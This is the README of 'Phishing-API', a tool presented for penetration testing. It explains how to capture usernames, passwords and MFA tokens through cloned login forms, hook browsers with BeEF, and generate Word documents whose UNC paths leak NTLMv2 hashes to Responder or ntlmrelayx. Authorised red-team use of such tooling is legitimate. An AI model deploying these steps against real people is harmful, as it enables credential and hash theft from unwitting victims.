# Phishing-API
Easy Deployment API for Phishing During Pentest Engagements.  Output to MySQL/Web Table &amp; Slack Bot.  Supports BEEF Hooking & HaveIBeenPwned!


This is intended to be a "quick and dirty" solution when Phishing.  For better results, use Evilnginx or another solution.  This is for someone who wants to quickly clone a site, start collecting credentials within minutes, and be notified in real time when there's a catch!  Enjoy!

## Update

I've added support for MS Word document generation.  Now, simply go to the API to create your payload, email it off, and wait for the Slack notification.  It automatically includes a UNC path back as well so if you're running Responder or ntlmrelayx you can capture NTLMv2 hashes!


# To Setup :

1) Import the DB SQL Dump Schema to a new MySQL Instance

2) Host the PHP from a web service (Apache, Nginx, IIS, etc)

3) Configure dbconfig.php and index.php variables

4) Limit Access to the "Results" Directory (Apache's Basic Auth is Recommended)

5) Use SSL and a Domain for the Hosted API (Configure DNS MASKED Forwarding Instead of an A Name Record for Best Results)



# To Use the API for Capturing Credentials : 

1) Point your HTML Form to https://YOUR-API-HERE

	`<FORM METHOD="POST" ACTION="https://YOUR-API-HERE">`

2)  Make sure the following authentication fields are set

	`<INPUT NAME="username">`
	
	`<INPUT NAME="password">`
	
	(OPTIONAL MFA FIELD)  `<INPUT NAME="token">`
	
3) Add hidden input fields for the name of the project and the URL the users should be redirected to after submitting their credentials to you (Recommend Legitimate Login Location - For Best Results Use a Clickjacking Vulnerable URL That Allows iFRAMEs)

	`<INPUT NAME="project" VALUE="My_Project_Here" TYPE="hidden">`
	
	`<INPUT NAME="redirect" VALUE="https://site_to_redirect_to" TYPE="hidden">`
	
4) Optionally include hidden input fields for altering the Slack bot's behavior (Name and Emoji)

	`<INPUT NAME="slackbotname" VALUE="SuckerBot" TYPE="hidden">`
	
	`<INPUT NAME="slackemoji" VALUE=":see_no_evil:" TYPE="hidden">`
	
5) Sit back and wait for the Slack bot to notify you.  When you want to see the credentials visit https://YOUR-API-HERE/results using your basic auth credentials


![Notification to Slack Channel](https://i.imgur.com/L8yYRMQ.png)

                  
            
![View Captured Credentials via Web](https://i.imgur.com/iLPU2pH.png)


# To Use the API for Generating Word Doc Payloads :

1) Modify /phishingdocs/index.php to include your Slack Webhook parameters

2) Browse out to YOUR_URL.com/phishingdocs to generate your DOCX

3) Optionally set up Responder or ntlmrelayx

4) Customize your doc, email it off, and Wait for the Slack Alerts!  

Bonus points if you use your docs as honeypot bait! :)


![Payload Generation](https://i.imgur.com/nyrJEz7.png)

                  
            
![Downloading and Openinig Doc](https://i.imgur.com/yHt0AuD.png)

                  
            
![Phishing Doc Slack Alert](https://i.imgur.com/dQahnC5.png)
